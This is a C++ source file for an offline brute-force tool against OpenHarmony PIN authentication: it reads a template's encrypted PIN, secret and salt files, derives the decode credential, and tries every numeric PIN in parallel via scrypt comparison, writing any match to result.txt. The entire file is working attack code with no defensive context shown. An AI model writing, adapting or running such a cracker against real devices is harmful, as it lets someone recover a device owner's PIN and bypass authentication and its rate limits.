#include "bruteForce.h"
#include "adaptor_algorithm.h"
#include "scrypt.h"
#include <fstream>
#include <iostream>
#include <omp.h>

#define SUCCESS 0
#define FAIL 1
#define ERROR 2

BruteForce::BruteForce()
{
}

BruteForce::~BruteForce()
{
    /* Free the memory. */
    DestoryBuffer(bfParam.pinDecodeCredential);
}

void BruteForce::initParam(Buffer *pinDecodeCredential, std::vector<uint8_t> salt)
{
    bfParam.pinDecodeCredential = pinDecodeCredential;
    bfParam.salt = salt;
}


/* Loading the pin file. */
int32_t BruteForce::load(uint64_t templateId)
{

   
    Buffer *storeData = CreateBufferBySize(CONST_PIN_DATA_EXPAND_LEN);
    if (!IsBufferValid(storeData)) {
        LOG_ERROR("generate storeData fail.");
        return ERROR;
    }

    /* Reading the encrypted pin file. */
    ResultCode ret = ReadPinFile(storeData->buf, storeData->maxSize, templateId, CRYPTO_SUFFIX);
    if (ret != RESULT_SUCCESS) {
        LOG_ERROR("read pin store file fail.");
        DestoryBuffer(storeData);
        return ERROR;
    }
    storeData->contentSize = storeData->maxSize;

    
    /* Reading the secret file. */
    Buffer *secret = CreateBufferBySize(SECRET_SIZE);
    if (!IsBufferValid(secret)) {
        LOG_ERROR("generate secret fail.");
        return ERROR;
    }
    if (ReadPinFile(secret->buf, secret->maxSize, templateId, SECRET_SUFFIX) != RESULT_SUCCESS) {
        LOG_ERROR("read pin secret file fail.");
        DestoryBuffer(secret);
        return ERROR;
    }
    secret->contentSize = secret->maxSize;

    /* Generate a device key from secret */
    Buffer *deviceKey = DeriveDeviceKey(secret);
    if (!IsBufferValid(deviceKey)) {
        LOG_ERROR("generate deviceKey fail.");
        DestoryBuffer(deviceKey);
        return ERROR;
    }

    /* Generate a pinDecodeCredential from deviceKey and encrypted pin. */
    Buffer *pinDecodeCredential = GenerateDecodeCredential(deviceKey, storeData);
    if (!IsBufferValid(pinDecodeCredential)) {
        LOG_ERROR("generate pinDecodeCredential fail.");
        DestoryBuffer(pinDecodeCredential);
        return ERROR;
    }

    /* Free the memory. */
    DestoryBuffer(secret);
    DestoryBuffer(deviceKey);
    DestoryBuffer(storeData);

    
    /* Reading the salt file. */
    uint32_t saltLen = CONST_SALT_LEN;
    std::vector<uint8_t> salt(saltLen);
    ret = ReadPinFile(&salt[0], saltLen, templateId, SALT_SUFFIX);
    if (ret != RESULT_SUCCESS) {
        LOG_ERROR("salt file read fail.");
        return -1;
    }

    /* Initializing the parameters for the brute force attack. */
    initParam(pinDecodeCredential, salt);

    return SUCCESS;
}

/**
 * It takes a vector of digits and displays them as a string
 * 
 * @param pinData The pin data to be displayed.
 */
void BruteForce::display(std::vector<uint8_t> &pinData)
{
    std::cout << "decode success:";
    for (auto digit : pinData) {
        std::cout << char(digit);
    }
    std::cout << std::endl;
}

/**
 * A function that tries to match the PIN code.
 * 
 * @param pinData the pin data to be tried
 * 
 * @return The return value is the result of the comparison of the PIN and PinDecodeCredential
 */
int32_t BruteForce::tryOne(std::vector<uint8_t> &pinData)
{
    OHOS::UserIam::PinAuth::Scrypt scrypter = OHOS::UserIam::PinAuth::Scrypt(bfParam.salt);
    std::vector<uint8_t> scryptPinData = scrypter.GetScrypt(pinData);
    ResultCode compareRet = CompareData(bfParam.pinDecodeCredential->buf, bfParam.pinDecodeCredential->contentSize,
        &scryptPinData[0], CONST_PIN_DATA_LEN);
    if (compareRet == RESULT_SUCCESS) {
        return SUCCESS;
    } else {
        // LOG_ERROR("CompareData fail.");
        return FAIL;
    }
}

/**
 * It opens a file called result.txt and writes the PIN to it
 * 
 * @param pinData The vector that contains the PIN.
 */
int32_t BruteForce::storeResult(std::vector<uint8_t> &pinData)
{
    std::ofstream outFile;
    outFile.open("result.txt");
    for (auto digit : pinData) {
        outFile << char(digit);
    }
    outFile.close();
    return SUCCESS;
}

/**
 * It returns the end of the range of numbers that the brute force algorithm will try
 * 
 * @param num The number of digits in the pin.
 */
int64_t BruteForce::pinRange(int32_t num)
{
    int64_t pinEnd = 1;
    for (int i = 0; i < num; i++)
        pinEnd *= 10;
    return pinEnd;
}

/**
 * It converts a numeric value to a vector of characters
 * 
 * @param numeric The number to convert to a vector
 * @param pinData The vector that will hold the PIN
 * @param num The number of digits in the pin
 */
void BruteForce::numericToVector(int64_t numeric, std::vector<uint8_t> &pinData, int32_t num)
{
    for (int d = 0; d < num; d++) {
        pinData[num - 1 - d] = (numeric % 10) + 48;
        numeric /= 10;
    }
}

/**
 * > This function is used to brute force the PIN code
 * 
 * @param templateId the template ID of the PIN
 * @param pinNum the number of digits in the PIN
 * @param threadNum the number of threads
 * 
 * @return The return value is the result of the function.
 */
int32_t BruteForce::BF(uint64_t templateId, int pinNum, int threadNum)
{
    load(templateId);
    std::cout << "start trying......" << std::endl;
#pragma omp parallel for num_threads(threadNum)
    for (int64_t numeric = 0; numeric < pinRange(pinNum); numeric++) {

        /* Converting the number to a vector(PIN). */
        std::vector<uint8_t> candidataPinData(pinNum, 0);
        numericToVector(numeric, candidataPinData, pinNum);

        /* Trying to match the PIN code. */
        if (this->tryOne(candidataPinData) == SUCCESS) {
            storeResult(candidataPinData);
            display(candidataPinData);
            printf("BF Success!!");
        }
    }
    return SUCCESS;
}